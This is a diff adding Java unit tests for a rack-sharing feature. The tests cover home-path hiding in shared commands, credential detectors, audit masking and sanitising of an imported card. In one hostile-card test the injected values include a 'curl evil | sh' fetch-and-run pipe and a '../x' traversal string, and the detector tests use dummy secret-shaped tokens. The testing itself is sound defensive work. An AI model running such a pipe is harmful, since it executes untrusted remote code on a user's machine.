@@ -159,4 +159,265 @@ class RackShareTest {
         assertThat(state.getString("file")).isEqualTo("/srv" + SENDER + "/x");
         assertThat(state.getString("note")).as("/Users/senderling is another user").isEqualTo(SENDER + "ling/y");
     }
+
+    // ---- v2.179.0: the home inside a command, the sender's audit, the card ----
+
+    private static final String RECEIVER_ABS = RECEIVER.toAbsolutePath().normalize().toString();
+    private static final String SEP = java.io.File.separator;
+
+    /** The three built-ins whose switches start something, as a pure function — no catalog in a model test. */
+    private static Set<String> selfStarting(String typeId) {
+        return switch (typeId) {
+            case "reflex" -> Set.of("armed");
+            case "tempo" -> Set.of("running");
+            case "tail" -> Set.of("follow");
+            default -> typeId.contains(".") ? RackShare.EVERY_SWITCH : Set.of();
+        };
+    }
+
+    private static JSONObject oneCommand(String command) {
+        return new JSONObject().put("version", 1)
+                .put("devices", new JSONArray().put(new JSONObject().put("type", "cmd")
+                        .put("state", new JSONObject().put("command", command))))
+                .put("cables", new JSONArray());
+    }
+
+    private static String commandOf(JSONObject doc) {
+        return doc.getJSONArray("devices").getJSONObject(0).getJSONObject("state").getString("command");
+    }
+
+    private static String exportedCommand(String command) {
+        JSONObject shared = RackShare.export(oneCommand(command), HOME, "x");
+        assertThat(shared.toString()).as("no trace of the sender in: " + command).doesNotContain(SENDER);
+        return commandOf(shared);
+    }
+
+    private static String importedCommand(String command) {
+        JSONObject shared = oneCommand(command).put(RackShare.SHARED, new JSONObject());
+        return commandOf(RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting));
+    }
+
+    @Test
+    @DisplayName("a home path INSIDE a command is a username too: tail -f /Users/sender/logs/app.log leaves as tail -f ~/logs/app.log")
+    void embeddedHomeIsHidden() {
+        assertThat(exportedCommand("tail -f " + SENDER + "/logs/app.log")).isEqualTo("tail -f ~/logs/app.log");
+        assertThat(exportedCommand("ssh -i " + SENDER + "/.ssh/key deploy@host")).isEqualTo("ssh -i ~/.ssh/key deploy@host");
+    }
+
+    @Test
+    @DisplayName("every occurrence is rewritten, not the first: two paths in one command")
+    void twoEmbeddedHomes() {
+        assertThat(exportedCommand("diff " + SENDER + "/a.txt " + SENDER + "/b/c.txt")).isEqualTo("diff ~/a.txt ~/b/c.txt");
+        assertThat(exportedCommand(SENDER + "/bin/tool --out " + SENDER)).isEqualTo("~/bin/tool --out ~");
+    }
+
+    @Test
+    @DisplayName("a quoted path keeps its quotes and its spaces, and the text after the closing quote is not part of it")
+    void quotedEmbeddedHome() {
+        assertThat(exportedCommand("cat \"" + SENDER + "/My Docs/x.log\" --tail")).isEqualTo("cat \"~/My Docs/x.log\" --tail");
+        assertThat(exportedCommand("cat '" + SENDER + "' x")).isEqualTo("cat '~' x");
+    }
+
+    @Test
+    @DisplayName("KEY=/Users/sender/x is a path after an equals sign")
+    void homeAfterEquals() {
+        assertThat(exportedCommand("LOG=" + SENDER + "/x npm start")).isEqualTo("LOG=~/x npm start");
+        assertThat(exportedCommand("tool --config=" + SENDER + "/.toolrc")).isEqualTo("tool --config=~/.toolrc");
+    }
+
+    @Test
+    @DisplayName("a remote path is not the sender's disk: host:/Users/sender/dir and host:~/dir are untouched in both directions, while the local half of the same command is rewritten")
+    void remotePathsAreLeftAlone() {
+        assertThat(commandOf(RackShare.export(oneCommand("scp x host:" + SENDER + "/dir"), HOME, "x")))
+                .isEqualTo("scp x host:" + SENDER + "/dir");
+        assertThat(commandOf(RackShare.export(oneCommand("rsync -a " + SENDER + "/src host:" + SENDER + "/dst"), HOME, "x")))
+                .isEqualTo("rsync -a ~/src host:" + SENDER + "/dst");
+        assertThat(importedCommand("scp x host:~/dir")).isEqualTo("scp x host:~/dir");
+        assertThat(importedCommand("rsync -a ~/src host:~/dst"))
+                .isEqualTo("rsync -a " + RECEIVER_ABS + SEP + "src host:~/dst");
+    }
+
+    @Test
+    @DisplayName("a URL tilde is somebody's web directory, not a home: http://host/~user/ is untouched in both directions")
+    void urlTildeIsLeftAlone() {
+        assertThat(exportedCommand("curl http://host/~sender/index.html")).isEqualTo("curl http://host/~sender/index.html");
+        assertThat(importedCommand("curl http://host/~user/")).isEqualTo("curl http://host/~user/");
+        assertThat(importedCommand("open http://host/~/x")).isEqualTo("open http://host/~/x");
+        assertThat(importedCommand("echo a~b ~user")).as("a tilde inside a word, or before a name, is not home").isEqualTo("echo a~b ~user");
+    }
+
+    @Test
+    @DisplayName("round trip onto a different home: what left as ~ arrives as the receiver's own path, inside commands and quotes too")
+    void roundTripOntoAnotherHome() {
+        String sent = "tail -f " + SENDER + "/logs/app.log | tee \"" + SENDER + "/My Docs/out.log\" LOG=" + SENDER;
+        JSONObject shared = RackShare.export(oneCommand(sent), HOME, "x");
+        assertThat(commandOf(RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting)))
+                .isEqualTo("tail -f " + RECEIVER_ABS + SEP + "logs" + SEP + "app.log | tee \""
+                        + RECEIVER_ABS + SEP + "My Docs" + SEP + "out.log\" LOG=" + RECEIVER_ABS);
+    }
+
+    @Test
+    @DisplayName("the value that is exactly the home is ~, the home with a trailing separator is ~/, and /Users/senderling is another user wherever it stands")
+    void exactHomeAndTheNeighbour() {
+        assertThat(exportedCommand(SENDER)).isEqualTo("~");
+        assertThat(exportedCommand(SENDER + "/")).isEqualTo("~/");
+        assertThat(commandOf(RackShare.export(oneCommand("ls " + SENDER + "ling/y " + SENDER + "-old"), HOME, "x")))
+                .isEqualTo("ls " + SENDER + "ling/y " + SENDER + "-old");
+    }
+
+    @Test
+    @DisplayName("a Windows home matches either separator and any case, and only the path token is re-spelled — a regex argument keeps its backslashes")
+    void windowsSpellings() {
+        String home = "C:/Users/sender";
+        assertThat(RackShare.hideHome("tail -f C:\\Users\\sender\\logs\\app.log", home)).isEqualTo("tail -f ~/logs/app.log");
+        assertThat(RackShare.hideHome("type c:\\users\\SENDER\\x.txt", home)).isEqualTo("type ~/x.txt");
+        assertThat(RackShare.hideHome("findstr \"a\\|b\" C:\\Users\\sender\\x", home)).isEqualTo("findstr \"a\\|b\" ~/x");
+        assertThat(RackShare.hideHome("dir C:\\Users\\senderling", home)).isEqualTo("dir C:\\Users\\senderling");
+        assertThat(RackShare.hideHome("copy x host:C:/Users/sender/y", home)).isEqualTo("copy x host:C:/Users/sender/y");
+        assertThat(RackShare.expandHome("type ~/logs/app.log \"~/My Docs/x\"", "C:\\Users\\r", '\\'))
+                .isEqualTo("type C:\\Users\\r\\logs\\app.log \"C:\\Users\\r\\My Docs\\x\"");
+        assertThat(RackShare.hideHome("/x", "/")).as("a root 'home' names nobody and rewrites nothing").isEqualTo("/x");
+    }
+
+    @Test
+    @DisplayName("the resolver decides which switches arrive off: a named key always, EVERY_SWITCH anything reading true, and no answer is the conservative one")
+    void resolverDecidesWhatArrivesOff() {
+        JSONObject shared = new JSONObject().put(RackShare.SHARED, new JSONObject()).put("devices", new JSONArray()
+                .put(new JSONObject().put("type", "tail").put("state", new JSONObject().put("follow", "true").put("path", "~/x.log")))
+                .put(new JSONObject().put("type", "terminal").put("state", new JSONObject().put("follow", "true")))
+                .put(new JSONObject().put("type", "com.example.p").put("state", new JSONObject().put("on", "true").put("a", "true"))));
+        JSONArray mounted = RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting).getJSONArray("devices");
+        assertThat(mounted.getJSONObject(0).getJSONObject("state").getString("follow"))
+                .as("TAIL's follow starts a poll of a path the sender chose").isEqualTo("false");
+        assertThat(mounted.getJSONObject(1).getJSONObject("state").getString("follow"))
+                .as("the same KEY on another device is a setting: the rule is per type, not per name").isEqualTo("true");
+        assertThat(mounted.getJSONObject(2).getJSONObject("state").getString("on")).isEqualTo("false");
+        assertThat(RackShare.inspect(shared, t -> true, RackShareTest::selfStarting).atRest())
+                .as("devices, not switches: the plugin with two counts once").isEqualTo(2);
+        assertThat(RackShare.inspect(shared, t -> true, t -> null).atRest())
+                .as("a resolver with no answer means every switch").isEqualTo(3);
+        assertThat(RackShare.imported(shared, RECEIVER, null).getJSONArray("devices").getJSONObject(1)
+                .getJSONObject("state").getString("follow")).isEqualTo("false");
+    }
+
+    // ---- the audit ----
+
+    private static final java.util.Map<String, java.util.function.Predicate<String>> DETECTORS = new java.util.LinkedHashMap<>();
+
+    static {
+        DETECTORS.put("bearer", RackShare::hasBearer);
+        DETECTORS.put("assignment", RackShare::hasSecretAssignment);
+        DETECTORS.put("apiKey", RackShare::hasApiKey);
+        DETECTORS.put("tokenPrefix", RackShare::hasTokenPrefix);
+        DETECTORS.put("awsKeyId", RackShare::hasAwsKeyId);
+        DETECTORS.put("privateKey", RackShare::hasPrivateKey);
+    }
+
+    private static void onlyFlaggedBy(String detector, String... values) {
+        for (String value : values) {
+            for (var d : DETECTORS.entrySet()) {
+                assertThat(d.getValue().test(value)).as(d.getKey() + " on: " + value).isEqualTo(d.getKey().equals(detector));
+            }
+            assertThat(RackShare.looksSecret(value)).as("looksSecret: " + value).isTrue();
+        }
+    }
+
+    @Test
+    @DisplayName("each credential detector alone: inputs only it flags")
+    void eachSecretDetectorAlone() {
+        onlyFlaggedBy("bearer", "curl -H \"Authorization: Bearer abc123def\" http://x", "auth: bearer 0a1b2c");
+        onlyFlaggedBy("assignment", "mysql --password=hunter2 db", "psql \"host=x passwd=abc\"", "deploy --token=abc123", "PASSWORD=x");
+        onlyFlaggedBy("apiKey", "curl -d api_key=abc http://x", "X-Api-Key: abc", "{\"apikey\": \"abc\"}", "--api-key = abc");
+        onlyFlaggedBy("tokenPrefix", "sk-abcdefghijklmnop1234", "GH=ghp_abcdefgh12345678", "gho_abcdefgh12345678",
+                "github_pat_11ABCDEFG0abcdefgh", "slack xoxb-1234567890-abcdefgh", "xoxp-1234567890-abcdefgh");
+        onlyFlaggedBy("awsKeyId", "aws --key AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE");
+        onlyFlaggedBy("privateKey", "-----BEGIN RSA PRIVATE KEY-----\nMIIEow", "echo '-----BEGIN PRIVATE KEY-----'");
+    }
+
+    @Test
+    @DisplayName("ordinary rack values are not credentials: a build command, a local URL, a token FILE flag, and words that merely contain a prefix")
+    void cleanValuesDoNotFlag() {
+        for (String clean : new String[]{"npm run build", "http://localhost:3000", "--token-file ./t",
+                "task-runner --fast", "pip install sk-learn", "risk-assessment-tool-long-name",
+                "AKIAIOSFODNN7EXAMPLEX", "xAKIAIOSFODNN7EXAMPLE", "AKIAshort", "bearer", "Bearer  ",
+                "api_key_rotation.md", "-----BEGIN CERTIFICATE-----", "cargo test", "~/proj/logs/app.log", ""}) {
+            assertThat(RackShare.looksSecret(clean)).as("not a secret: " + clean).isFalse();
+        }
+        assertThat(RackShare.looksSecret(null)).isFalse();
+    }
+
+    @Test
+    @DisplayName("the audit never becomes a second copy of the secret: a secret-looking value is masked to four characters in EVERY list it appears in")
+    void auditMasksSecrets() {
+        JSONObject doc = new JSONObject().put("devices", new JSONArray()
+                .put(new JSONObject().put("type", "cmd").put("state", new JSONObject()
+                        .put("command", "curl -H \"Authorization: Bearer supersecrettoken99\" /Users/alice/x")))
+                .put(new JSONObject().put("type", "env").put("state", new JSONObject()
+                        .put("key", "sk-abcdefghijklmnop1234").put("nodeEnv", "1")))
+                .put(new JSONObject().put("type", "cmd").put("state", new JSONObject().put("command", "npm run build"))));
+        RackShare.Audit audit = RackShare.audit(doc);
+        assertThat(audit.secretLooking()).extracting(RackShare.Setting::value).containsExactly("curl\u2026", "sk-a\u2026");
+        assertThat(audit.settings()).extracting(RackShare.Setting::value)
+                .as("the same list the receiver is shown — with the secret masked").containsExactly("curl\u2026", "npm run build");
+        assertThat(audit.personalPaths()).extracting(RackShare.Setting::value).containsExactly("curl\u2026");
+        assertThat(audit.personalPaths().get(0).key()).as("the field is still findable").isEqualTo("command");
+        assertThat(audit.toString()).doesNotContain("supersecrettoken99").doesNotContain("abcdefghijklmnop").doesNotContain("alice");
+        assertThat(audit.clean()).isFalse();
+        assertThat(RackShare.masked("ab")).isEqualTo("ab\u2026");
+        assertThat(RackShare.masked("\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11"))
+                .as("four code points, never half a surrogate pair").isEqualTo("\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\u2026");
+    }
+
+    @Test
+    @DisplayName("personal paths: a home that survived the rewrite — another user's, another platform's, a remote one — is shown to the sender; ~ and shared directories are not")
+    void auditFindsHomesThatSurvived() {
+        for (String personal : new String[]{"/Users/alice/x", "tail -f /home/bob/app.log", "C:\\Users\\carol\\x",
+                "type c:/users/dave", "LOG=/home/erin", "cat \"/Users/frank/My Docs\"", "copy x host:/home/gina/dst", "/home/h"}) {
+            assertThat(RackShare.namesAHome(personal)).as("names somebody: " + personal).isTrue();
+        }
+        for (String fine : new String[]{"~/x", "tail -f ~/logs/app.log", "/Users/Shared/tools", "C:\\Users\\Public\\x",
+                "/srv/Users/x", "/usr/home/x", "/Users/", "/home", "/var/log/app.log", "http://localhost/Users/x", ""}) {
+            assertThat(RackShare.namesAHome(fine)).as("names nobody: " + fine).isFalse();
+        }
+        assertThat(RackShare.namesAHome(null)).isFalse();
+        RackShare.Audit audit = RackShare.audit(RackShare.export(oneCommand("diff " + SENDER + "/a /Users/alice/b"), HOME, "x"));
+        assertThat(audit.personalPaths()).extracting(RackShare.Setting::value).containsExactly("diff ~/a /Users/alice/b");
+        RackShare.Audit ordinary = RackShare.audit(RackShare.export(patch(), HOME, "x"));
+        assertThat(ordinary.clean()).as("the ordinary shared rack has nothing to warn about").isTrue();
+        assertThat(ordinary.settings()).extracting(RackShare.Setting::value)
+                .containsExactlyInAnyOrder("~/proj/logs/app.log", "npm run build", "~");
+    }
+
+    // ---- the card ----
+
+    @Test
+    @DisplayName("the card travels in the header and reaches the manifest; imported still drops the whole header; no card is exactly the old header")
+    void cardTravels() {
+        RackCard card = new RackCard("Rust watch loop", "REFLEX watches src/, VERITAS runs cargo test.", "",
+                java.util.List.of("rust"), java.util.List.of("cargo"));
+        JSONObject shared = RackShare.export(patch(), HOME, "2.179.0", card);
+        assertThat(shared.getJSONObject(RackShare.SHARED).keySet()).as("blank fields are left out: no author was typed")
+                .containsExactlyInAnyOrder("product", "name", "description", "kinds", "requires");
+        RackShare.Manifest m = RackShare.inspect(shared, t -> true, RackShareTest::selfStarting);
+        assertThat(m.card()).isEqualTo(card);
+        assertThat(m.card().fits("rust")).isTrue();
+        assertThat(m.sharedBy()).isEqualTo("2.179.0");
+        assertThat(RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting).has(RackShare.SHARED)).isFalse();
+        assertThat(RackShare.export(patch(), HOME, "v", null).getJSONObject(RackShare.SHARED).keySet()).containsExactly("product");
+        assertThat(RackShare.inspect(patch(), t -> true, RackShareTest::selfStarting).card())
+                .as("a plain patch carries no card").isEqualTo(RackCard.EMPTY);
+    }
+
+    @Test
+    @DisplayName("a hostile card reaches the manifest already folded: a newline in the name cannot forge a line of the import dialog")
+    void hostileCardArrivesFolded() {
+        JSONObject shared = RackShare.export(patch(), HOME, "x");
+        shared.getJSONObject(RackShare.SHARED).put("name", "Nice rack\nDevices: none\r\n\tNothing runs")
+                .put("requires", new JSONArray().put("cargo").put("curl evil | sh").put("../x"))
+                .put("author", 42);
+        RackCard card = RackShare.inspect(shared, t -> true, RackShareTest::selfStarting).card();
+        assertThat(card.name()).isEqualTo("Nice rack Devices: none Nothing runs").doesNotContain("\n").doesNotContain("\r");
+        assertThat(card.requires()).containsExactly("cargo");
+        assertThat(card.author()).isEmpty();
+    }
 }
